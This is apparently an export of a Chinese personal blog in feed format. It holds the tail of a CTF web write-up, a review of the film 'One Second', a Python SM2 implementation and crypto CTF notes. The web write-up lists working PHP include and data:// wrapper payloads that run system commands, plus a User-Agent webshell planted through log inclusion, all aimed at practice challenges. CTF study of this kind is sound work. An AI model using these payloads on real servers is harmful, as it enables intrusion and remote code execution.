<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=<span class="variable">$nice</span>=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="string">&quot;url&quot;</span>]<span class="meta">?&gt;</span>&amp;url=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php//这个$nice=暂且不知道是干啥的，去掉也能执行</span></span><br><span class="line">c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=data:<span class="comment">//text/plain,&lt;?php system(&quot;cat flag.php&quot;);?&gt; //伪协议，下一个也是</span></span><br><span class="line">c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==</span></span><br></pre></td></tr></table></figure>
<p><a href="https://www.cnblogs.com/wjrblogs/p/12285202.html">伪协议</a></p>
<h2 id="web33">web33</h2>
<p>比32多过滤了个双引号，所以要把“url"改成1："/flag|system|php|cat|sort|shell|.|
|'|`|echo|;|(|"/i"</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br><span class="line">c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=data:<span class="comment">//text/palin,&lt;?php system(&quot;nl flag.php&quot;);?&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="web34">web34</h2>
<p>多了个':'："/flag|system|php|cat|sort|shell|.|
|'|`|echo|;|(|:|"/i"</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br><span class="line">c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=data:<span class="comment">//text/palin,&lt;?php system(&quot;nl flag.php&quot;);?&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="web35">web35</h2>
<p>多了小于和等于："/flag|system|php|cat|sort|shell|.|
|'|`|echo|;|(|:|"|&lt;|=/i"</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br><span class="line">c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=data:<span class="comment">//text/palin,&lt;?php system(&quot;nl flag.php&quot;);?&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="web36">web36</h2>
<p>多了数字："/flag|system|php|cat|sort|shell|.|
|'|`|echo|;|(|:|"|&lt;|=|/|[0-9]/i"</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=<span class="keyword">include</span><span class="variable">$_GET</span>[a]<span class="meta">?&gt;</span>&amp;a=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br><span class="line">c=<span class="keyword">include</span><span class="variable">$_GET</span>[a]<span class="meta">?&gt;</span>&amp;a=data:<span class="comment">//text/palin,&lt;?php system(&quot;nl flag.php&quot;);?&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="web37">web37</h2>
<p>变成了文件包含</p>
<p><img src="../images/web/image-20220718144945562.png" alt="image-20220718144945562"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</span></span><br><span class="line">c=data:<span class="comment">//text/palin,&lt;?php system(&quot;nl fla*&quot;);?&gt;</span></span><br><span class="line"><span class="comment">//还可以配合UA头执行日志包含</span></span><br><span class="line">c=/<span class="keyword">var</span>/log/nginx/access.log</span><br></pre></td></tr></table></figure>
<p>UA头写马执行日志操作：</p>
<ol type="1">
<li><p>先用c=/var/log/nginx/access.log发现能看日志<img src="../images/web/image-20220718161423024.png" alt="image-20220718161423024"></p></li>
<li><p>User-Agent头写马：</p>
<p><img src="../images/web/image-20220718161940874.png" alt="image-20220718161940874"></p>
<p>User-Agent: <?php eval($_POST[1]);?></p></li>
<li><p>再看日志<img src="../images/web/image-20220718162107763.png" alt="image-20220718162107763"></p></li>
<li><p>然后就可以命令执行了：</p>
<p><img src="../images/web/image-20220718162135410.png" alt="image-20220718162135410"></p></li>
<li><p>1=system("nl flag.php");</p>
<p><img src="../images/web/image-20220718162225485.png" alt="image-20220718162225485"></p></li>
</ol>
<h2 id="web38">web38</h2>
<p>"/flag|php|file/i"</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</span></span><br><span class="line">c=data:<span class="comment">//text/palin,&lt;?php system(&quot;nl fla*&quot;);?&gt;</span></span><br><span class="line"><span class="comment">//还可以配合UA头执行日志包含</span></span><br><span class="line">c=/<span class="keyword">var</span>/log/nginx/access.log</span><br></pre></td></tr></table></figure>
<p>和上一题差不多</p>
<h2 id="web39">web39</h2>
<p><img src="../images/web/image-20220718165432040.png" alt="image-20220718165432040"></p>
<p>用<code>c=data://text/plain,&lt;?=phpinfo();?&gt;</code>测试后缀有无影响，发现无：</p>
<p><img src="../images/web/image-20220718170657074.png" alt="image-20220718170657074"></p>
<p>.php
因为前面的php语句已经闭合了，所以后面的.php会被当成html页面直接显示在页面上，起不到什么作用。data协议后有个?&gt;,已经闭合前面的php代码，所以后面的php拼接，不会影响php代码的执行</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=data:<span class="comment">//text/palin,&lt;?php system(&quot;nl fla*&quot;);?&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="web40">web40</h2>
<p>"/[0-9]|~|`|@|#|\$|%|^|&amp;|*|（|）|-|=|+|{|[|]|}|:|'|"|,|&lt;|.|&gt;|/|?|\\/i"</p>
<h2 id="web41">web41</h2>
<h2 id="web42">web42</h2>
<h2 id="web43">web43</h2>
<h2 id="web44">web44</h2>
<h2 id="web45">web45</h2>
<h2 id="web46">web46</h2>
<h2 id="web47">web47</h2>
<h2 id="web48">web48</h2>
<h2 id="web49">web49</h2>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>《一秒钟》观后感</title>
    <url>/2022/05/17/2022/%E3%80%8A%E4%B8%80%E7%A7%92%E9%92%9F%E3%80%8B%E8%A7%82%E5%90%8E%E6%84%9F/</url>
    <content><![CDATA[<p>影视鉴赏的最后一节课，老师给放了张艺谋导演的一秒钟，由于这次不再布置作业，也没有当作考试，所以就自己记录一下观后感吧，是一部很优秀的作品，内容也很丰富，回去后凭着记忆随便记点东西
<span id="more"></span></p>
<p>《一秒钟》是张艺谋本人拍摄的电影，并且他全程使用胶片拍摄，表达了他在这个数字化时代对胶片的热爱和坚持。电影的背景是文革时代的大西北，整个电影给了茫茫黄土大量的镜头，展示这种自然景观。电影通过看电影展开（套娃，有意思的是里面的电影也是用胶片播放的，有一段剧情是胶片被破坏后，人们用布将胶片抬起来，就像抬棺一样，这也仿佛是胶片电影的结局；而女主所唱的ed，歌词也是在映射胶片，可以理解成胶片的挽歌。电影里还给了胶片很多特写，可以看出张艺谋真的很喜欢胶片。可惜，数字化是时代的潮流，任何事物、甚至是阶级、国家，都挡不住时代潮流。</p>
<p>电影里最核心的还是男女主，男主是一名劳改犯，从劳改农场逃出来看电影只为见自己的女儿，尽管在影片中只出现了“一秒钟”，这也是标题的来源；女主和她的弟弟是孤儿，所以起名也很简单，为了偷胶片来赔偿别人的“胶片灯罩”，虽然她的父亲对姐弟俩很差，并且据她本人说“早就死了”，但她仍然很想念自己的父亲，渴望父爱。于是，男主寻找女儿，女主寻找父亲，这一对巧合就这样碰撞在一起了。在电影最后，文革结束高考恢复，男主也被劳改所放出来，于是他来到二场（看电影的地方之一）；女主也长大成人，从一个不谙世事的女孩转变为成熟的大人，他们二人一起去沙漠里寻找之前被丢弃的男主女儿的胶片，电影结束。</p>
<p>在整个故事中，可以看出男主是一个不善言辞的人，易怒、好斗，所以在当时那个时代被人陷害，仅因打架劳改多年，也因此妻离子散，无法与他的女儿相见。尽管女主反复偷窃胶片，但她确实不是坏人——因为弟弟弄坏了别人的胶片台灯，又因为胶片是买不到的，只能去偷，而弟弟也因为邻居小孩的欺凌不敢出门。在这样一个敏感的时代，仿佛每个人的遭遇都充满了不幸，但是从整体上来看，又充满了希望。放映员号召大家一起清洗胶片时，每个人都充满了干劲，以此为己任，全然体现集体主义的美好。《三体1》中，叶文洁的家庭因批斗遭遇不幸，但她住在东北乡村的那段时间全然忘记了生活的苦闷。尽管如此，信号已经发出，过去的事已无法挽回。或许，这便是时代的悲哀吧。</p>
<p>电影里还有一位刻画的非常饱满的人物，就是放映员。在他的行为举止中，很能看出那个时代里小人物的悲剧。对村民来说，他是高高在上的放映员，表面上呼风唤雨；作为小领导，他害怕自己的职位被他人，不断贬低想要接替他位置的人；同时，他对保卫科的头却点头哈腰（个人理解保卫科的头官位比他大），在他叫保卫科去抓捕男主时不忘祈求对方为自己记上一功。同时，得知男主是劳改犯身份的前后，他的态度大相径庭；而从另一方面，他对自己的工作非常负责，懂得各种技巧，所谓“四个场唯独他会拉长胶片”；最后，这样一位呼风唤雨的大人物，却也有自己的不幸：之所以他的儿子不是接班人，因为他儿子小时错将胶片的清洗液当水喝下，而他因疏忽使儿子烧坏了脑子，只能放牛。而在揭发了男主后，他为保卫科殴打了他感到自责，于是将他女儿的那两篇胶带送给了他，男主也请求他把那个胶片灯罩送给女主，从后来可以看到他确实这么做。1个人认为这个角色是刻画的最细腻的一位。</p>
<p>最后这段也反映了当时对人权的漠视。男主在被保卫科抓走后，他们抢走了男主女儿的胶片，还扔掉了。面对男主撕心的呼喊，他们做的却只是嘲笑。</p>
<p>电影还有很多丰富的内容，但是俺可能给忘了qwq，就到此为止吧。这门课确实教给了我很多，有机会的话还想再学一些看电影的方法论。其实自己也知道这是假的，这辈子大概是再也不会去学了，这就像去年的中华文化一般，尽管我知道自己再也不会去看了，但还是想记录下现在的感想。</p>
]]></content>
      <categories>
        <category>movie</category>
      </categories>
  </entry>
  <entry>
    <title>SM2</title>
    <url>/2022/03/14/2022/SM2/</url>
    <content><![CDATA[<p>大创撸了个sm2（水一下博客</p>
<span id="more"></span>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"><span class="keyword">import</span> sm3, key</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> choice</span><br><span class="line"></span><br><span class="line">random_hex = <span class="keyword">lambda</span> x: <span class="string">&#x27;&#x27;</span>.join([choice(<span class="string">&#x27;0123456789abcdef&#x27;</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(x)])</span><br><span class="line"></span><br><span class="line"><span class="comment">#默认的ECC参数</span></span><br><span class="line">default_ecc_paras = &#123;</span><br><span class="line">    <span class="string">&#x27;p&#x27;</span> :  <span class="number">0x8542D69E4C044F18E8B92435BF6FF7DE457283915C45517D722EDB8B08F1DFC3</span>,</span><br><span class="line">    <span class="string">&#x27;a&#x27;</span> :  <span class="number">0x787968B4FA32C3FD2417842E73BBFEFF2F3C848B6831D7E0EC65228B3937E498</span>,</span><br><span class="line">    <span class="string">&#x27;b&#x27;</span> :  <span class="number">0x63E4C6D3B23B0C849CF84241484BFE48F61D59A5B16BA06E6E12D1DA27C5249A</span>,</span><br><span class="line">    <span class="string">&#x27;G&#x27;</span> : (<span class="number">0x421DEBD61B62EAB6746434EBC3CC315E32220B3BADD50BDC4C4E6C147FEDD43D</span>,</span><br><span class="line">           <span class="number">0x0680512BCBB42C07D47349D2153B70C4E5D7FDFCBFA36EA1A85841B9E46E09A2</span>),</span><br><span class="line">    <span class="string">&#x27;n&#x27;</span> :  <span class="number">0x8542D69E4C044F18E8B92435BF6FF7DD297720630485628D5AE74EE7C32E79B7</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#曲线的零点</span></span><br><span class="line">zero_point = (<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SM2</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, private_key, public_key, ecc_paras = default_ecc_paras</span>):</span><br><span class="line">        self.private_key = private_key</span><br><span class="line">        self.public_key = public_key</span><br><span class="line">        self.ecc_paras = ecc_paras</span><br><span class="line">        self.para_len = <span class="number">64</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">add_point</span>(<span class="params">self, P1, P2</span>):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> P1 == zero_point:</span><br><span class="line">            <span class="keyword">return</span> P2</span><br><span class="line">        <span class="keyword">if</span> P2 == zero_point:</span><br><span class="line">            <span class="keyword">return</span> P1</span><br><span class="line"></span><br><span class="line">        (p1x, p1y), (p2x, p2y) = P1, P2</span><br><span class="line">        <span class="keyword">if</span> p1x == p2x <span class="keyword">and</span> (p1y != p2y <span class="keyword">or</span> p1y == <span class="number">0</span>):</span><br><span class="line">            <span class="keyword">return</span> zero_point</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#计算斜率</span></span><br><span class="line">        <span class="keyword">if</span> p1x == p2x:</span><br><span class="line">            lam = (<span class="number">3</span> * p1x * p1x + self.ecc_paras[<span class="string">&#x27;a&#x27;</span>]) * invert(<span class="number">2</span> * p1y , self.ecc_paras[<span class="string">&#x27;p&#x27;</span>]) % self.ecc_paras[<span class="string">&#x27;p&#x27;</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            lam = (p2y - p1y) * invert(p2x - p1x , self.ecc_paras[<span class="string">&#x27;p&#x27;</span>]) % self.ecc_paras[<span class="string">&#x27;p&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        x = (lam**<span class="number">2</span> - p1x - p2x) % self.ecc_paras[<span class="string">&#x27;p&#x27;</span>]</span><br><span class="line">        y = (lam * (p1x - x) - p1y) % self.ecc_paras[<span class="string">&#x27;p&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">int</span>(x),<span class="built_in">int</span>(y))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_kg</span>(<span class="params">self, k, P</span>):</span><br><span class="line">        tmp = zero_point</span><br><span class="line">        <span class="keyword">while</span>(k):</span><br><span class="line">            <span class="keyword">if</span>(k &amp; <span class="number">1</span>):</span><br><span class="line">                tmp = self.add_point(tmp, P)</span><br><span class="line">            P = self.add_point(P, P)</span><br><span class="line">            k &gt;&gt;= <span class="number">1</span></span><br><span class="line">        form = <span class="string">&#x27;%%0%dx&#x27;</span> % self.para_len <span class="comment">#格式化坐标</span></span><br><span class="line">        form = form * <span class="number">2</span></span><br><span class="line">        <span class="keyword">return</span> form % (tmp[<span class="number">0</span>], tmp[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sign</span>(<span class="params">self, data</span>): </span><br><span class="line">        <span class="comment">#data：待签名的信息，private_key:私钥</span></span><br><span class="line">        e = <span class="built_in">int</span>(data.<span class="built_in">hex</span>(),<span class="number">16</span>)</span><br><span class="line">        s = <span class="number">0</span></span><br><span class="line">        r = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> s == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">while</span> r == <span class="number">0</span> <span class="keyword">or</span> r + k == self.ecc_paras[<span class="string">&#x27;n&#x27;</span>]:</span><br><span class="line">                k = <span class="built_in">int</span>(random_hex(self.para_len), <span class="number">16</span>)</span><br><span class="line">                xy = self.get_kg(k, self.ecc_paras[<span class="string">&#x27;G&#x27;</span>])</span><br><span class="line">                x = <span class="built_in">int</span>(xy[:self.para_len], <span class="number">16</span>)</span><br><span class="line">                y = <span class="built_in">int</span>(xy[self.para_len:], <span class="number">16</span>)</span><br><span class="line">                r = (e + x) % self.ecc_paras[<span class="string">&#x27;n&#x27;</span>]</span><br><span class="line">            s = (k - r * self.private_key) * invert(self.private_key + <span class="number">1</span>, self.ecc_paras[<span class="string">&#x27;n&#x27;</span>]) % self.ecc_paras[<span class="string">&#x27;n&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;%064x%064x&#x27;</span> % (r, s)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">verify</span>(<span class="params">self, sign, data</span>):</span><br><span class="line">        <span class="comment">#sign = (r, s), data：被签名的信息，public_key：公钥</span></span><br><span class="line">        r = <span class="built_in">int</span>(sign[:self.para_len], <span class="number">16</span>)</span><br><span class="line">        s = <span class="built_in">int</span>(sign[self.para_len:], <span class="number">16</span>)</span><br><span class="line">        <span class="keyword">assert</span> r &gt;= <span class="number">1</span> <span class="keyword">and</span> r &lt;= self.ecc_paras[<span class="string">&#x27;n&#x27;</span>] - <span class="number">1</span></span><br><span class="line">        <span class="keyword">assert</span> s &gt;= <span class="number">1</span> <span class="keyword">and</span> s &lt;= self.ecc_paras[<span class="string">&#x27;n&#x27;</span>] - <span class="number">1</span></span><br><span class="line">        e = <span class="built_in">int</span>(data.<span class="built_in">hex</span>(), <span class="number">16</span>)</span><br><span class="line">        t = (r + s) % self.ecc_paras[<span class="string">&#x27;n&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> t == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;验证失败！&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        P1 = self.get_kg(s, self.ecc_paras[<span class="string">&#x27;G&#x27;</span>])</span><br><span class="line">        P2 = self.get_kg(t, self.public_key)</span><br><span class="line">        </span><br><span class="line">        x, y = self.add_point((<span class="built_in">int</span>(P1[:self.para_len], <span class="number">16</span>),<span class="built_in">int</span>(P1[self.para_len:], <span class="number">16</span>)), </span><br><span class="line">                              (<span class="built_in">int</span>(P2[:self.para_len], <span class="number">16</span>),<span class="built_in">int</span>(P2[self.para_len:], <span class="number">16</span>)))</span><br><span class="line">        R = (e + x) % self.ecc_paras[<span class="string">&#x27;n&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> R == r</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="comment">#加密</span></span><br><span class="line">        msg = data.<span class="built_in">hex</span>()</span><br><span class="line">        k = <span class="built_in">int</span>(random_hex(self.para_len),<span class="number">16</span>)</span><br><span class="line">        C1 = self.get_kg(k, self.ecc_paras[<span class="string">&#x27;G&#x27;</span>])</span><br><span class="line">        xy = self.get_kg(k, self.public_key)</span><br><span class="line">        x2 = xy[<span class="number">0</span>:self.para_len]</span><br><span class="line">        y2 = xy[self.para_len:<span class="number">2</span>*self.para_len]</span><br><span class="line">        mlen = <span class="built_in">len</span>(msg)</span><br><span class="line">        t = sm3.sm3_kdf(xy, mlen/<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(t, <span class="number">16</span>) == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        form = <span class="string">&#x27;%%0%dx&#x27;</span> % mlen</span><br><span class="line">        C2 = form % (<span class="built_in">int</span>(msg, <span class="number">16</span>) ^ <span class="built_in">int</span>(t, <span class="number">16</span>))</span><br><span class="line">        C3 = sm3.sm3_hash([i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;%s%s%s&#x27;</span> % (x2, msg, y2))])</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;%s%s%s&#x27;</span> % (C1, C3, C2))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="comment">#解密</span></span><br><span class="line">        data = data.<span class="built_in">hex</span>()</span><br><span class="line">        len_2 = <span class="number">2</span> * self.para_len</span><br><span class="line">        len_3 = len_2 + <span class="number">64</span></span><br><span class="line">        C1 = data[<span class="number">0</span>:len_2]</span><br><span class="line">        C1x = <span class="built_in">int</span>(C1[:self.para_len],<span class="number">16</span>)</span><br><span class="line">        C1y = <span class="built_in">int</span>(C1[self.para_len:],<span class="number">16</span>)</span><br><span class="line">        <span class="keyword">assert</span> C1y**<span class="number">2</span> % self.ecc_paras[<span class="string">&#x27;p&#x27;</span>] == (C1x**<span class="number">3</span> + self.ecc_paras[<span class="string">&#x27;a&#x27;</span>] * C1x + self.ecc_paras[<span class="string">&#x27;b&#x27;</span>]) % self.ecc_paras[<span class="string">&#x27;p&#x27;</span>]</span><br><span class="line">        </span><br><span class="line">        C3 = data[len_2:len_3]</span><br><span class="line">        C2 = data[len_3:]</span><br><span class="line">        xy = self.get_kg(self.private_key,(C1x, C1y))</span><br><span class="line">        x2 = xy[<span class="number">0</span>:self.para_len]</span><br><span class="line">        y2 = xy[self.para_len:len_2]</span><br><span class="line">        cl = <span class="built_in">len</span>(C2)</span><br><span class="line">        t = sm3.sm3_kdf(xy, cl/<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(t, <span class="number">16</span>) == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        form = <span class="string">&#x27;%%0%dx&#x27;</span> % cl</span><br><span class="line">        M = form % (<span class="built_in">int</span>(C2,<span class="number">16</span>) ^ <span class="built_in">int</span>(t,<span class="number">16</span>))</span><br><span class="line">        u = sm3.sm3_hash([i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;%s%s%s&#x27;</span>% (x2,M,y2))])</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>.fromhex(M)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sign_and_verify</span>():</span><br><span class="line">    sk1, pk1 = key.gen_key()</span><br><span class="line">    sm2_user = SM2(sk1, pk1)</span><br><span class="line">    data = <span class="string">b&#x27;sh1kaku&#x27;</span>*<span class="number">100</span></span><br><span class="line">    sign_data = sm2_user.sign(data)</span><br><span class="line">    <span class="built_in">print</span>(sm2_user.verify(sign_data, data))</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_and_decrypt</span>():</span><br><span class="line">    sk1, pk1 = key.gen_key()</span><br><span class="line">    sm2_user = SM2(sk1, pk1)</span><br><span class="line">    data = <span class="string">b&#x27;sh1kaku&#x27;</span>*<span class="number">100</span></span><br><span class="line">    en = sm2_user.encrypt(data)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;加密后：&#x27;</span>, en)</span><br><span class="line">    de = sm2_user.decrypt(en)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;解密：&#x27;</span>, de)</span><br><span class="line"></span><br><span class="line">sign_and_verify()</span><br><span class="line">encrypt_and_decrypt()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>SM</tag>
      </tags>
  </entry>
  <entry>
    <title>做题记录</title>
    <url>/2022/07/09/2022/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>做题</p>
<span id="more"></span>
<h1 id="cycling">cycling</h1>
<h2 id="carmichael-function">Carmichael function</h2>
<p><span class="math display">\[
定义为a^{m} \equiv 1 \;mod\;n成立的最小正整数m
，其中( a , n ) = 1 ，将m记作\lambda(n)\\
换言之，如果a^{m} \equiv 1 \;mod\;n，则m\;|\;\lambda(n)
\]</span></p>
<h2 id="carmichael定理">Carmichael定理</h2>
<p><span class="math display">\[
\lambda(p^r)=\left\{
\begin{aligned}
&amp; \varphi(p^r) \;if\;p^r = \;2,3^r,4,5^r,7^r等奇数素数以及2、4 \\
&amp; \frac{1}{2}\varphi(p^r) \;if\;p^r = \;8,16,32,64等2的3次幂以上\\
\end{aligned}
\right.
\]</span></p>
<h2 id="计算lambdan">计算<span class="math display">\[\lambda(n)\]</span></h2>
<p>由整数分解定理 <span class="math display">\[
n = p{_{1}^{r_1}}p{_{2}^{r_2}}···p{_{n}^{r_n}}
\]</span> 那么 <span class="math display">\[
\lambda(n) =
lcm(\lambda(p{_{1}^{r_1}}),\lambda(p{_{2}^{r_2}}),···,\lambda(p{_{n}^{r_n}}))
\]</span></p>
<p>h+1易分解为17个小素数，且没有2次及以上的素数 <span class="math display">\[
\because h+1\; |\;\lambda(\lambda(n))\\
\therefore 用primes相乘+1判断是否为素数，并凑出可能的\lambda(n)\\
\]</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> trange</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">0x99efa9177387907eb3f74dc09a4d7a93abf6ceb7ee102c689ecd0998975cede29f3ca951feb5adfb9282879cc666e22dcafc07d7f89d762b9ad5532042c79060cdb022703d790421a7f6a76a50cceb635ad1b5d78510adf8c6ff9645a1b179e965358e10fe3dd5f82744773360270b6fa62d972d196a810e152f1285e0b8b26f5d54991d0539a13e655d752bd71963f822affc7a03e946cea2c4ef65bf94706f20b79d672e64e8faac45172c4130bfeca9bef71ed8c0c9e2aa0a1d6d47239960f90ef25b337255bac9c452cb019a44115b0437726a9adef10a028f1e1263c97c14a1d7cd58a8994832e764ffbfcc05ec8ed3269bb0569278eea0550548b552b1</span></span><br><span class="line">ct = <span class="number">0x339be515121dab503106cd190897382149e032a76a1ca0eec74f2c8c74560b00dffc0ad65ee4df4f47b2c9810d93e8579517692268c821c6724946438a9744a2a95510d529f0e0195a2660abd057d3f6a59df3a1c9a116f76d53900e2a715dfe5525228e832c02fd07b8dac0d488cca269e0dbb74047cf7a5e64a06a443f7d580ee28c5d41d5ede3604825eba31985e96575df2bcc2fefd0c77f2033c04008be9746a0935338434c16d5a68d1338eabdcf0170ac19a27ec832bf0a353934570abd48b1fe31bc9a4bb99428d1fbab726b284aec27522efb9527ddce1106ba6a480c65f9332c5b2a3c727a2cca6d6951b09c7c28ed0474fdc6a945076524877680</span></span><br><span class="line">h = <span class="number">2</span>**<span class="number">1025</span> - <span class="number">3</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">response = requests.get(<span class="string">r&#x27;http://factordb.com/api&#x27;</span>, params=&#123;<span class="string">&quot;query&quot;</span>: <span class="built_in">str</span>(h + <span class="number">1</span>)&#125;)</span><br><span class="line"></span><br><span class="line">primes = [<span class="built_in">int</span>(_[<span class="number">0</span>]) <span class="keyword">for</span> _ <span class="keyword">in</span> response.json().get(<span class="string">&quot;factors&quot;</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> prod(primes) == h + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">cands = []</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">2</span>**<span class="built_in">len</span>(primes))):</span><br><span class="line">    tmp = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(primes)):</span><br><span class="line">        <span class="keyword">if</span> k % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">            tmp *= primes[i]</span><br><span class="line">        k //= <span class="number">2</span></span><br><span class="line">    tmp += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> is_prime(tmp):</span><br><span class="line">        cands.append(tmp)</span><br><span class="line"></span><br><span class="line"><span class="comment"># check</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="built_in">len</span>(cands))):</span><br><span class="line">    tmp_p = cands[i]</span><br><span class="line">    <span class="keyword">assert</span> is_prime(tmp_p)</span><br><span class="line">    <span class="keyword">assert</span> (h + <span class="number">1</span>) % (tmp_p - <span class="number">1</span>) == <span class="number">0</span></span><br><span class="line"></span><br><span class="line">L = prod(cands)</span><br><span class="line">d = <span class="built_in">int</span>(<span class="built_in">pow</span>(e, -<span class="number">1</span>, L))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(<span class="built_in">pow</span>(ct, d, n))))</span><br></pre></td></tr></table></figure>
<h1 id="benaloh">benaloh</h1>
<p>public key cryptosystems， which is homomorphic.</p>
<h2 id="key-generation">Key Generation</h2>
<p>Given block size <em>r</em>, a public/private key pair is generated
as follows:</p>
<ol type="1">
<li><p>Choose large primes <em>p</em> and <em>q</em> such that <em>r |
